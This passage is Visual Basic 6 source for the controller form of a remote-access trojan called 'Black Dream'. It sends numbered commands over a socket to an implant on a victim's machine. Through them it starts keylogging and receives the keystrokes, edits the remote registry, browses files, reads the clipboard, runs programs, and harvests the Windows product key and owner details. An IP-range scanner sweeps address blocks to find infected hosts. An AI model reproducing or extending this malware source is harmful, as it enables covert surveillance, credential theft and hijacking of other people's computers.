    If RegValueName.Text = "" Then MsgBox "Please enter a registry value.", vbInformation, "Registry options": Exit Sub
    
    For M = 1 To Len(RegPath)
        If Right(RegPath, 1) = "\" Or Right(RegPath, 1) = "/" Then RegPath = Left(RegPath, Len(RegPath) - 1)
    Next M
    
    If RegOpt0.Value = True Then
        WinSockCtl.SendData "024" & RegPath & Chr(0) & EntryName & Chr(0) & RegValueName
    ElseIf RegOpt1.Value = True Then
        WinSockCtl.SendData "026" & RegPath & Chr(0) & EntryName & Chr(0) & RegValueName
    ElseIf RegOpt2.Value = True Then
        WinSockCtl.SendData "031" & RegPath & Chr(0) & EntryName & Chr(0) & RegValueName
    ElseIf RegOpt3.Value = True Then
        WinSockCtl.SendData "030" & RegPath
    ElseIf RegOpt4.Value = True Then
        WinSockCtl.SendData "028" & RegPath
    End If
        
End Sub

Private Sub CmdRequestDoubleClickRate_Click()
    On Error Resume Next
    WinSockCtl.SendData "005"
End Sub

Private Sub CmdRequestInfo_Click()
    On Error Resume Next
    TextComputerInfo.Text = ""
    WinSockCtl.SendData "104"
End Sub

Private Sub CmdRestart_Click()

    Dim TempIP As String
    Dim TempPort As String
    If WinSockCtl.RemoteHostIP = "" Then
        FrmDialog.Item(0).Visible = True
        FrmDialog.Item(1).Visible = False
        lblstate.Caption = "Disconnected"
        UnloadFormsOpen
        MsgBox "Could not restart server. Please make sure you are connected correctly and the address and Port are valid.", vbCritical, "Error"
        Exit Sub
    End If
    
    If WinSockCtl.State <> 7 Then
        FrmDialog.Item(0).Visible = True
        FrmDialog.Item(1).Visible = False
        lblstate.Caption = "Disconnected"
        UnloadFormsOpen
        MsgBox "Could not restart server. You are not connected to the current address.", vbInformation, "Connection states"
        Exit Sub
    End If
    
    TempIP = WinSockCtl.RemoteHostIP
    TempPort = WinSockCtl.RemotePort
    
    On Error GoTo FinaliseError

    WinSockCtl.Close
    WinSockCtl.Connect TempIP, TempPort
    
    FrmDialog.Item(0).Visible = False
    FrmDialog.Item(1).Visible = True
    
    Exit Sub
FinaliseError:
    lblstate.Caption = "Disconnected"
    FrmDialog.Item(0).Visible = True
    FrmDialog.Item(1).Visible = False
    UnloadFormsOpen
    MsgBox "Error, could not re-establish connection. Please check the specified address and connection Port.", vbCritical, "Error"
End Sub

Private Sub CmdCloseCnnt_Click()
    lblstate.Caption = "Disconnected"
    If WinSockCtl.State <> 7 Then
        FrmDialog.Item(0).Visible = True
        FrmDialog.Item(1).Visible = False
        UnloadFormsOpen
        MsgBox "You are not currently connected to any address.", vbInformation, "Connection"
        Exit Sub
    End If
    WinSockCtl.Close
    UnloadFormsOpen
    FrmDialog.Item(0).Visible = True
    FrmDialog.Item(1).Visible = False
    MsgBox "Success, Your connection to specified address has been closed.", vbInformation, "Success, connection closed"
End Sub

Private Sub CmdClear_Click()
    On Error Resume Next
    CmdConnectScan.Enabled = False
    For M = 1 To ListIP.ListItems.Count
        ListIP.ListItems.Remove M
        CmdClear_Click
    Next M
End Sub

Private Sub CmdRestoreButtons_Click()
    On Error Resume Next
    WinSockCtl.SendData "100"
End Sub

Private Sub CmdScan_Click()
    
    Dim IPVar01 As Integer
    Dim IPVar02 As Integer
    Dim IPVar03 As Integer
    Dim IPVar04 As Integer
    
    ScanRun = True
    
    MenuED 0, False
    
    WinsockIPScan.Close
    
    For IPVar01 = IPSTART.Item(0) To IPEND.Item(0)
        For IPVar02 = IPSTART.Item(1) To IPEND.Item(1)
            For IPVar03 = IPSTART.Item(2) To IPEND.Item(2)
                For IPVar04 = IPSTART.Item(3) To IPEND.Item(3)
                If ScanRun = False Then
                    MenuED 0, True
                    Exit Sub
                End If
                
                lblscan.Caption = "Scanning: " & IPVar01 & "." & IPVar02 & "." & IPVar03 & "." & IPVar04
                lblscan.Refresh
                If IDIPAddress(IPVar01 & "." & IPVar02 & "." & IPVar03 & "." & IPVar04) = False Then
                    'Do nothing
                End If
                
                WinsockIPScan.Close
                
                Next IPVar04
            Next IPVar03
        Next IPVar02
    Next IPVar01
    
    MsgBox "IP Scanning complete.", vbInformation, "Scan"
    lblscan.Caption = "Scanning: 0.0.0.0"
    WinsockIPScan.Close

    MenuED 0, True

End Sub

Private Function IDIPAddress(IP As String) As Boolean
    WinsockIPScan.Close
    On Error GoTo FinaliseError
    WinsockIPScan.Connect IP, ConnectPort
FinaliseError:
    Do Until WinsockIPScan.State <> 6
        DoEvents
    Loop
    IDIPAddress = True
End Function

Private Sub MenuED(MenuNumber As Integer, TypeNum As Boolean)
    If MenuNumber = 0 Then
        If TypeNum = True Then
            If ListIP.ListItems.Count <> 0 Then
                CmdConnectScan.Enabled = True
            End If
            CmdClear.Enabled = True
            CmdScan.Enabled = True
            CmdRestart.Enabled = True
            CmdConnect.Enabled = True
            CmdCloseCnnt.Enabled = True
            CmdConnectionInfo.Enabled = True
            IPConnect.Enabled = True
            For M = 0 To IPSTART.UBound
                IPSTART.Item(M).Enabled = True
                IPEND.Item(M).Enabled = True
            Next M
            CmdCancelScan.Enabled = False
        Else
            CmdConnectScan.Enabled = False
            CmdClear.Enabled = False
            CmdScan.Enabled = False
            CmdRestart.Enabled = False
            CmdConnect.Enabled = False
            CmdCloseCnnt.Enabled = False
            CmdConnectionInfo.Enabled = False
            IPConnect.Enabled = False
            For M = 0 To IPSTART.UBound
                IPSTART.Item(M).Enabled = False
                IPEND.Item(M).Enabled = False
            Next M
            CmdCancelScan.Enabled = True
        End If
    End If
End Sub

Private Sub CmdSendMessage_Click()
    On Error Resume Next
    If MessagePopup.Text = "" Then MsgBox "Please specify a popup message.", vbInformation, "Popup messages": Exit Sub
    For M = 0 To 4
        If MessagePPType.Item(M).Value = True Then
            WinSockCtl.SendData "001" & M & MessagePopup.Text
        End If
    Next M
End Sub

Private Sub CmdSetRate_Click()
    On Error Resume Next
    If SetChrRate.Text = "" Then MsgBox "Please specify a new character blink rate.", vbInformation, "Setting character blink rate": Exit Sub
    WinSockCtl.SendData "004" & SetChrRate
End Sub

Private Sub CmdSetText_Click()
    On Error Resume Next
    If TextClipBoard.Text = "" Then MsgBox "Please specify some text to send to the clipboard.", vbInformation, "Setting Clipboard text": Exit Sub
    WinSockCtl.SendData "084" & TextClipBoard.Text
End Sub

Private Sub CmdSetTrail_Click()
    On Error Resume Next
    If TextMouseTrail.Text = "" Then MsgBox "Please specify a mouse trail length in the textbox.", vbInformation, "Setting mouse trails": Exit Sub
    WinSockCtl.SendData "096" & TextMouseTrail.Text
End Sub

Private Sub CmdShowClock_Click()
    On Error Resume Next
    WinSockCtl.SendData "052"
End Sub

Private Sub CmdShowDesktop_Click()
    On Error Resume Next
    WinSockCtl.SendData "021"
End Sub

Private Sub CmdShowDesktopIcons_Click()
    On Error Resume Next
    WinSockCtl.SendData "067"
End Sub

Private Sub CmdShowProgramsinTB_Click()
    On Error Resume Next
    WinSockCtl.SendData "056"
End Sub

Private Sub CmdShowRunDialog_Click()
    On Error Resume Next
    If TextRunDialogTitle.Text = "" Then TextRunDialogTitle.Text = "Run"
    If TextRunDialogPrompt.Text = "" Then TextRunDialogPrompt.Text = "Type the name of a program, folder, document, or Internet resource, and Windows will open it for you."
    WinSockCtl.SendData "073" & TextRunDialogTitle.Text & Chr(0) & TextRunDialogPrompt.Text
End Sub

Private Sub CmdShowStartButton_Click()
    On Error Resume Next
    WinSockCtl.SendData "050"
End Sub

Private Sub CmdShowSysIcons_Click()
    On Error Resume Next
    WinSockCtl.SendData "054"
End Sub

Private Sub CmdShowTaskBar_Click()
    On Error Resume Next
    WinSockCtl.SendData "019"
End Sub

Private Sub CmdShowToolbar_Click()
    On Error Resume Next
    WinSockCtl.SendData "058"
End Sub

Private Sub CmdStartDocument_Click()
    On Error Resume Next
    If TextStartDocument.Text = "" Then MsgBox "Please specify a document to start.", vbInformation, "Starting a document": Exit Sub
    WinSockCtl.SendData "023" & TextStartDocument.Text
End Sub

Private Sub CmdStartKeyLogging_Click()
    On Error Resume Next
    WinSockCtl.SendData "102"
End Sub

Private Sub CmdSwapMouseButtons_Click()
    On Error Resume Next
    WinSockCtl.SendData "099"
End Sub

Private Sub CmdViewControls_Click()
    On Error Resume Next
    FrmControl.Show
End Sub

Private Sub Form_Load()
    FrmDialog.Item(1).Visible = False
    If App.PrevInstance = True Then
        MsgBox "This application is already running.", vbInformation, "Black Dream"
        End
    End If
    FrmTool.Show
    WinSockCtl.Close
    WinsockIPScan.Close
    WaitForInfo = True
    ListIP.ColumnHeaders.Add , , "IP address", 1500
    ListIP.ColumnHeaders.Add , , "Owners name", 1500
    ListIP.ColumnHeaders.Add , , "OS version", 1000
    ListIP.ColumnHeaders.Add , , "Server version", 1450
End Sub

Private Sub Form_Unload(Cancel As Integer)
    WinSockCtl.Close
    End
End Sub

Private Sub IPEND_Change(Index As Integer)
    On Error Resume Next
    If IPEND.Item(Index) > 255 Then
        IPEND.Item(Index) = 255
    ElseIf IPEND.Item(Index) < 0 Then
        IPEND.Item(Index) = 0
    End If
    
    'If IPEND.Item(Index) < IPSTART.Item(Index) Then
    '    IPEND.Item(Index) = IPSTART.Item(Index)
    'End If
    
End Sub

Private Sub IPSTART_Change(Index As Integer)
    On Error Resume Next
    If IPSTART.Item(Index) > 255 Then
        IPSTART.Item(Index) = 255
        IPEND.Item(Index) = IPSTART.Item(Index)
    ElseIf IPSTART.Item(Index) < 0 Then
        IPSTART.Item(Index) = 0
    End If
    
    If IPSTART.Item(Index) > IPEND.Item(Index) Then
        IPEND.Item(Index) = IPSTART.Item(Index)
    End If
    
End Sub

Private Sub LblMail_Click()
    On Error Resume Next
    Shell "start mailto:NeoBPI@Yahoo.com", vbNormalFocus
End Sub

Private Sub RegOpt0_Click()
    RegPath.Enabled = True
    EntryName.Enabled = True
    RegValueName.Enabled = True
    CmdRegSet.Enabled = True
    TextGetValue.Enabled = True
    CmdRegGet.Enabled = True
End Sub

Private Sub Regopt1_Click()
    RegPath.Enabled = True
    EntryName.Enabled = True
    RegValueName.Enabled = True
    CmdRegSet.Enabled = True
    TextGetValue.Enabled = True
    CmdRegGet.Enabled = True
End Sub

Private Sub RegOpt2_Click()
    RegPath.Enabled = True
    EntryName.Enabled = True
    RegValueName.Enabled = True
    CmdRegSet.Enabled = True
    TextGetValue.Enabled = True
    CmdRegGet.Enabled = True
End Sub

Private Sub RegOpt3_Click()
    RegPath.Enabled = True
    EntryName.Enabled = False
    RegValueName.Enabled = False
    CmdRegSet.Enabled = True
    TextGetValue.Enabled = False
    CmdRegGet.Enabled = False
End Sub

Private Sub RegOpt4_Click()
    RegPath.Enabled = True
    EntryName.Enabled = False
    RegValueName.Enabled = False
    CmdRegSet.Enabled = True
    TextGetValue.Enabled = False
    CmdRegGet.Enabled = False
End Sub

Private Sub SetChrRate_KeyPress(KeyAscii As Integer)
    Const Number_s = "0123456789"
    If InStr(1, Number_s, Chr(KeyAscii)) <> 0 Then
        'Do nothing
    Else
        KeyAscii = 0
    End If
End Sub

Private Sub SetCursorX_KeyPress(KeyAscii As Integer)
    Const Number_s = "0123456789"
    If InStr(1, Number_s, Chr(KeyAscii)) <> 0 Then
        'Do nothing
    Else
        KeyAscii = 0
    End If
End Sub

Private Sub TabStripMenu_Click()
    For M = 0 To FrmOptions.UBound
        If M <> TabStripMenu.SelectedItem.Index Then
            FrmOptions.Item(M).Visible = False
        Else
            FrmOptions.Item(M).Visible = True
        End If
    Next M
End Sub

Private Sub TextHwndWindow_KeyPress(KeyAscii As Integer)
    Const Number_s = "0123456789"
    If InStr(1, Number_s, Chr(KeyAscii)) <> 0 Then
        'Do nothing
    Else
        KeyAscii = 0
    End If
End Sub

Private Sub TextMouseTrail_KeyPress(KeyAscii As Integer)
    Const Number_s = "0123456789"
    If InStr(1, Number_s, Chr(KeyAscii)) <> 0 Then
        'Do nothing
    Else
        KeyAscii = 0
    End If
End Sub

Private Sub TextPhone_KeyPress(KeyAscii As Integer)
    Const Number_s = "0123456789"
    If InStr(1, Number_s, Chr(KeyAscii)) <> 0 Then
        'Do nothing
    Else
        KeyAscii = 0
    End If
End Sub

Private Sub WinsockCtl_Close()
    lblstate.Caption = "Disconnected"
    If WinSockCtl.State <> 7 Then
        WinSockCtl.Close: MsgBox "The server connection has been closed.", vbCritical, "Possible Error or Server Ended"
        UnloadFormsOpen
        FrmDialog.Item(0).Visible = True
        FrmDialog.Item(1).Visible = False
    End If
End Sub

Private Sub WinsockCtl_Connect()
    If WinSockCtl.State <> 7 Then
        WinSockCtl.Close
        UnloadFormsOpen
        FrmDialog.Item(0).Visible = True
        FrmDialog.Item(1).Visible = False
        Exit Sub
    End If
    lblstate.Caption = "Connected"
    FrmDialog.Item(0).Visible = False
    FrmDialog.Item(1).Visible = True
    MsgBox "Success, Your connection to specified address has been enabled.", vbInformation, "Success, Found connection"
End Sub

Private Sub WinSockCtl_DataArrival(ByVal bytesTotal As Long)
    
    On Error GoTo FinaliseError
    
    Dim Data As String
    Dim GetLine As Long
    Dim LastLine As Long
    Dim ChrState As String
    Dim ProcessFileCount As Integer
    Dim DriveListCount As Long
    
    WinSockCtl.GetData Data
    
    If Left(Data, 12) = "[DRIVE LIST]" Then
        Data = Right(Data, Len(Data) - 12)
        GetLine = 0
        LastLine = 1
        For M = 1 To Len(Data)
            ChrState = Mid(Data, M, 1)
            If ChrState = Chr(0) Or M = 1 Then
                Select Case GetLine
                    Case 0:
                        DriveListCount = CLng(Mid(Data, 1, InStr(1, Data, Chr(0)))): LastLine = InStr(1, Data, Chr(0))
                    Case Is <> 0:
                        If GetLine < DriveListCount Then
                            FrmFileBrowse.ListDrives.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))), 3, 3
                            LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Else
                            FrmFileBrowse.ListDrives.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1)), 3, 3
                        End If
                End Select
                GetLine = GetLine + 1
            End If
        Next M
    End If
    
    If Left(Data, 1) = "A" Then
        StoredData(CLng(Mid(Data, 2, 1))) = Mid(Data, 3, Len(Data) - 2)
    End If
        
    'Used in cases of appended data
    If Left(Data, 10) = "[FILE ADD]" Then
        FrmFileBrowse.ListFiles.ListItems.Clear
        Data = Chr(0)
        For M = 0 To 10
            Data = Data & StoredData(M)
        Next M
        GetLine = 0
        LastLine = 1
        For M = 1 To Len(Data)
            ChrState = Mid(Data, M, 1)
            If ChrState = Chr(0) Then
                If GetLine = 0 Then
                    FrmFileBrowse.ListFiles.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1) - 1, Len(Data) - GetLine + LastLine - (GetLine - 1) - 1)
                Else
                    If Left(FrmFileBrowse.ListFiles.ListItems.Item(1).Text, 1) = "" Then
                        FrmFileBrowse.ListFiles.ListItems.Item(1).Text = Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1))
                    Else
                        FrmFileBrowse.ListFiles.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1))
                    End If
                End If
                LastLine = InStr(LastLine + 1, Data, Chr(0))
                GetLine = GetLine + 1
            End If
        Next M
    End If
    
    'Used in cases of appended data
    If Left(Data, 10) = "[FOLD ADD]" Then
        FrmFileBrowse.ListFolders.ListItems.Clear
        Data = Chr(0)
        For M = 0 To 10
            Data = Data & StoredData(M)
        Next M
        GetLine = 0
        LastLine = 1
        For M = 1 To Len(Data)
            ChrState = Mid(Data, M, 1)
            If ChrState = Chr(0) Then
                If GetLine = 0 Then
                    FrmFileBrowse.ListFolders.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1) - 1, Len(Data) - GetLine + LastLine - (GetLine - 1) - 1)
                Else
                    If Left(FrmFileBrowse.ListFolders.ListItems.Item(1).Text, 1) = "" Then
                        FrmFileBrowse.ListFolders.ListItems.Item(1).Text = Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1))
                    Else
                        FrmFileBrowse.ListFolders.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1))
                    End If
                End If
                LastLine = InStr(LastLine + 1, Data, Chr(0))
                GetLine = GetLine + 1
            End If
        Next M
    End If
    
    'Used in cases for small un-appended data
    If Left(Data, 11) = "[FOLD LIST]" Then
        FrmFileBrowse.ListFolders.ListItems.Clear
        Data = Right(Data, Len(Data) - 12)
        GetLine = 0
        LastLine = 1
        For M = 1 To Len(Data)
            ChrState = Mid(Data, M, 1)
            If ChrState = Chr(0) And Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1)) <> "" Then
                If GetLine = 0 Then
                    FrmFileBrowse.ListFolders.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1) - 1, Len(Data) - GetLine + LastLine - (GetLine - 1) - 1), 1, 1
                Else
                    FrmFileBrowse.ListFolders.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1)), 1, 1
                End If
                LastLine = InStr(LastLine + 1, Data, Chr(0))
                GetLine = GetLine + 1
            End If
        Next M
    End If
    
    'Used in cases for small un-appended data
    If Left(Data, 11) = "[FILE LIST]" Then
        FrmFileBrowse.ListFiles.ListItems.Clear
        Data = Right(Data, Len(Data) - 12)
        GetLine = 0
        LastLine = 1
        For M = 1 To Len(Data)
            ChrState = Mid(Data, M, 1)
            If ChrState = Chr(0) And Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1)) <> "" Then
                If GetLine = 0 Then
                    FrmFileBrowse.ListFiles.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1) - 1, Len(Data) - GetLine + LastLine - (GetLine - 1) - 1)
                    FileType = ""
                    For N = 1 To Len(FrmFileBrowse.ListFiles.ListItems.Item(1).Text)
                        GetChr0 = Right(FrmFileBrowse.ListFiles.ListItems.Item(1).Text, N)
                        GetChr1 = Left(GetChr0, 1)
                        If GetChr1 = "." Then
                            FileType = GetStringValue("HKEY_CLASSES_ROOT\" & "." & Right(FrmFileBrowse.ListFiles.ListItems.Item(1).Text, N - 1), "")
                            If FileType = "" Then FileType = UCase(Right(FrmFileBrowse.ListFiles.ListItems.Item(1).Text, N - 1)) & " FILE"
                            Exit For
                        End If
                    Next N
                    FrmFileBrowse.ListFiles.ListItems.Item(1).SubItems(1) = FileType
                Else
                    FrmFileBrowse.ListFiles.ListItems.Add , , Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1))
                    FileType = ""
                    For N = 1 To Len(FrmFileBrowse.ListFiles.ListItems.Item(GetLine + 1).Text)
                        GetChr0 = Right(FrmFileBrowse.ListFiles.ListItems.Item(GetLine + 1).Text, N)
                        GetChr1 = Left(GetChr0, 1)
                        If GetChr1 = "." Then
                            FileType = GetStringValue("HKEY_CLASSES_ROOT\" & "." & Right(FrmFileBrowse.ListFiles.ListItems.Item(GetLine + 1).Text, N - 1), "")
                            If FileType = "" Then FileType = UCase(Right(FrmFileBrowse.ListFiles.ListItems.Item(GetLine + 1).Text, N - 1)) & " FILE"
                            Exit For
                        End If
                    Next N
                    FrmFileBrowse.ListFiles.ListItems.Item(GetLine + 1).SubItems(1) = FileType
                End If
                LastLine = InStr(LastLine + 1, Data, Chr(0))
                GetLine = GetLine + 1
            End If
        Next M
    End If
        
    'Used in cases for small un-appended data
    If Left(Data, 6) = "[FSAA]" Then
        Data = Right(Data, Len(Data) - 6)
        GetLine = 0
        LastLine = 1
        For M = 1 To Len(Data)
            ChrState = Mid(Data, M, 1)
            If ChrState = Chr(0) And Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1)) <> "" Then
                If GetLine = 0 Then
                    FrmFileBrowse.ListFiles.ListItems.Item(1).SubItems(2) = FormatKB(CLng(Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1))))
                Else
                    FrmFileBrowse.ListFiles.ListItems.Item(GetLine + 1).SubItems(2) = FormatKB(CLng(Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1))))
                End If
                LastLine = InStr(LastLine + 1, Data, Chr(0))
                GetLine = GetLine + 1
            End If
        Next M
    End If
    
    If Left(Data, 1) = "M" Then
        Select Case Mid(Data, 2, 1)
            Case 0: MsgBox Mid(Data, 3, Len(Data) - 2), vbOKOnly, "Message"
            Case 1: MsgBox Mid(Data, 3, Len(Data) - 2), vbQuestion, "Message"
            Case 2: MsgBox Mid(Data, 3, Len(Data) - 2), vbInformation, "Message"
            Case 3: MsgBox Mid(Data, 3, Len(Data) - 2), vbExclamation, "Message"
            Case 4: MsgBox Mid(Data, 3, Len(Data) - 2), vbCritical, "Message"
        End Select
    End If
    
    If Left(Data, 1) = Chr(0) Then TextKeyLog.Text = TextKeyLog.Text & Mid(Data, 2, Len(Data) - 1)
    If Left(Data, 3) = "00B" Then If Len(TextKeyLog) > 0 Then TextKeyLog.Text = Left(TextKeyLog, Len(TextKeyLog) - 1)
    If Left(Data, 3) = "NL0" Then TextKeyLog.Text = TextKeyLog.Text & vbNewLine 'vbCrLf
    
    If Left(Data, 5) = "[ESC]" Then TextKeyLog.Text = TextKeyLog.Text & "[ESC]"
    If Left(Data, 5) = "[TAB]" Then TextKeyLog.Text = TextKeyLog.Text & "[TAB]"
    If Left(Data, 6) = "[FKEY]" Then TextKeyLog.Text = TextKeyLog.Text & Mid(Data, 7, Len(Data) - 6)
    If Left(Data, 7) = "[ENTER]" Then TextKeyLog.Text = TextKeyLog.Text & "[ENTER]"
    
    TextKeyLog.SelStart = Len(TextKeyLog.Text)
    
    Select Case Left(Data, 3)
        Case "000": '
        Case "001":
            KeyBoardType.Text = Mid(Data, 4, Len(Data) - 3)
        Case "002":
            ChrBlinkRate.Text = Mid(Data, 4, Len(Data) - 3)
        Case "003":
            DoubleClickRate.Text = Mid(Data, 4, Len(Data) - 3)
        Case "004":
            If Mid(Data, 4, Len(Data) - 3) = "1" Then
                MsgBox "Sound card exists on remote computer.", vbInformation, "Sound card check"
            Else
                MsgBox "No sound card exists on remote computer.", vbInformation, "Sound card check"
            End If
        Case "005": '
        Case "006": '
        Case "007":
            TextGetValue.Text = Mid(Data, 4, Len(Data) - 3)
        Case "008":
            TextGetValue.Text = Mid(Data, 4, Len(Data) - 3)
        Case "009":
            TextGetValue.Text = Mid(Data, 4, Len(Data) - 3)
        Case "010": '
        Case "011": '
        Case "012": '
        Case "013": 'Add to new version
        Case "014":
            MouseXPos.Text = Mid(Data, 4, Len(Data) - 3)
        Case "015":
            MouseYPos.Text = Mid(Data, 4, Len(Data) - 3)
        Case "016": '
        Case "017": '
        Case "018": '
        Case "019":
            Data = Right(Data, Len(Data) - 3)
            MsgBox "The specified file (" & ExecPath & ") is (" & Data & ") as an executable on remote address.", vbInformation, "File exec Request"
        Case "020":
            For M = 1 To Len(Mid(Data, 4, Len(Data) - 3))
                If Mid(Mid(Data, 4, Len(Data) - 3), M, 1) = Chr(0) Then
                    TextWindowName.Text = Mid(Data, 4, Len(Data) - 4 - Len(Right(Data, Len(Mid(Data, 4, Len(Data) - 3)) - M)))
                    ClassWindowName.Text = Right(Data, Len(Mid(Data, 4, Len(Data) - 3)) - M)
                    If TextWindowName.Text = "" And ClassWindowName.Text = "" Then MsgBox "Could not find window in specified Hwnd.", vbInformation, "Hwnd Window finder"
                    Exit For
                End If
            Next M
        Case "021":
            TextClipBoard.Text = Mid(Data, 4, Len(Data) - 3)
        Case "022": 'Add to new version
        Case "023":
            Data = Right(Data, Len(Data) - 3)
            GetLine = 0
            LastLine = 1
            For M = 1 To Len(Data)
                ChrState = Mid(Data, M, 1)
                If ChrState = Chr(0) Or M = 1 Then
                    Select Case GetLine
                        Case 0: TextComputerInfo.Text = TextComputerInfo.Text & "Product ID: " & Mid(Data, 1, InStr(1, Data, Chr(0))): LastLine = InStr(1, Data, Chr(0))
                        Case 1: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Product Key: " & Mid(Data, GetLine + LastLine, InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 2: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Product Name: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 3: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Program files Directory: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 4: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Organisation: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 5: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Owner: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 6: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "System root: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 7: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Version: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 8: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Version Number: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 9: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Device Directory: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 10: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Configuration Directory: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 11: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Commom files Directory: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 12: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Media Directory: " & Mid(Data, GetLine + LastLine - (GetLine - 1), InStr(LastLine + 1, Data, Chr(0))): LastLine = InStr(LastLine + 1, Data, Chr(0))
                        Case 13: TextComputerInfo.Text = TextComputerInfo.Text & vbNewLine & "Other Device Directory: " & Mid(Data, GetLine + LastLine - (GetLine - 1), Len(Data) - GetLine + LastLine - (GetLine - 1)): LastLine = InStr(LastLine + 1, Data, Chr(0))
                    End Select
                    GetLine = GetLine + 1
                End If
            Next M
    End Select
    
    Exit Sub
    
FinaliseError:
    
    MsgBox "An error occured while processing recieved data. The task you may of requested may of not been complete.", vbCritical, "Possible Task Error"
    
End Sub

Private Sub WinSockCtl_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    If WinSockCtl.State <> 7 Then WinSockCtl.Close
    MsgBox Number & " " & Description, vbCritical, "Error"
    lblstate.Caption = "Disconnected"
    FrmDialog.Item(0).Visible = True
    FrmDialog.Item(1).Visible = False
    UnloadFormsOpen
End Sub

Private Sub WinsockIPScan_Close()
    If WinsockIPScan.State <> 7 Then WinsockIPScan.Close
End Sub

Private Sub WinsockIPScan_Connect()
    ListIP.ListItems.Add , , WinsockIPScan.RemoteHostIP
    WinsockIPScan.SendData "0-1"
    Do Until WaitForInfo = False
        DoEvents
    Loop
    WaitForInfo = True
    WinsockIPScan.Close
End Sub

Private Sub WinsockIPScan_DataArrival(ByVal bytesTotal As Long)
    
    Dim Data As String
    Dim SendData As String
    Dim Val01 As String
    Dim Val02 As String
    Dim Val03 As String
    Dim ChrState As String
    
    WinsockIPScan.GetData Data
    
    WaitForInfo = False
    
    If Left(Data, 6) = "[INFO]" Then
        SendData = Mid(Data, 7, Len(Data) - 6)
        For M = 1 To Len(SendData)
            ChrState = Mid(SendData, M, 1)
            If ChrState = Chr(0) Or M = 1 Then
                Select Case CountVal
                    Case 0: lastlen = M: CountVal = 1
                    Case 1: Val01 = Left(SendData, M - lastlen): lastlen = M: CountVal = 2
                    Case 2:
                    Val03 = Right(SendData, Len(SendData) - M): CountVal = 3
                    Val02 = Mid(SendData, lastlen + 1, Len(SendData) - (lastlen + Len(Val03) + 1))
                End Select
            End If
        Next M
        ListIP.ListItems.Item(ListIP.ListItems.Count).SubItems(1) = Val01
        ListIP.ListItems.Item(ListIP.ListItems.Count).SubItems(2) = Val02
        ListIP.ListItems.Item(ListIP.ListItems.Count).SubItems(3) = Val03
    End If
    
End Sub

Private Sub WinsockIPScan_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    WinsockIPScan.Close
End Sub
